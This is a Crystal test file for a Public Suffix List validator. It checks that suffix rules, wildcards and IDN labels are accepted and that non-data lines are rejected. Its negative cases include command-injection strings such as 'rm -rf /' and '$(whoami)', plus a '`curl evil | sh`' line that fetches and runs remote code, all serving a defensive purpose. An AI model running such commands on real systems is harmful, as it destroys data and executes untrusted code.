require "./spec_helper"
require "../src/nokizaru/psl"
require "../src/nokizaru/psl/validate"

describe Nokizaru::PSL::Validate do
  describe ".valid_rule_line?" do
    it "accepts suffix rules, wildcards, exceptions, and IDN labels" do
      {"com", "co.uk", "*.ck", "!city.kawasaki.jp", "xn--p1ai", "ישראל", "ålesund.no"}.each do |rule|
        Nokizaru::PSL::Validate.valid_rule_line?(rule).should be_true
      end
    end

    it "rejects anything that is not a bare suffix" do
      {"evil; rm -rf /", "a b", "http://x", "a/../b", "`id`", "", "a..b", "x$(whoami)"}.each do |rule|
        Nokizaru::PSL::Validate.valid_rule_line?(rule).should be_false
      end
    end
  end

  describe ".delta_is_data_only?" do
    it "accepts a delta of only comment and rule lines" do
      old = "// ===BEGIN ICANN DOMAINS===\ncom\n// ===END ICANN DOMAINS===\n"
      updated = "// VERSION: 2026\n// ===BEGIN ICANN DOMAINS===\ncom\nnet\n// ===END ICANN DOMAINS===\n"
      ok, _ = Nokizaru::PSL::Validate.delta_is_data_only?(old, updated)
      ok.should be_true
    end

    it "rejects a delta that introduces a non-data line" do
      ok, reason = Nokizaru::PSL::Validate.delta_is_data_only?("com\n", "com\n`curl evil | sh`\n")
      ok.should be_false
      reason.should contain("non-data")
    end
  end

  describe ".structural_ok?" do
    it "accepts the embedded list" do
      ok, _ = Nokizaru::PSL::Validate.structural_ok?(Nokizaru::PSL::DATA)
      ok.should be_true
    end

    it "rejects input missing the section markers" do
      ok, _ = Nokizaru::PSL::Validate.structural_ok?("com\nnet\n")
      ok.should be_false
    end
  end
end
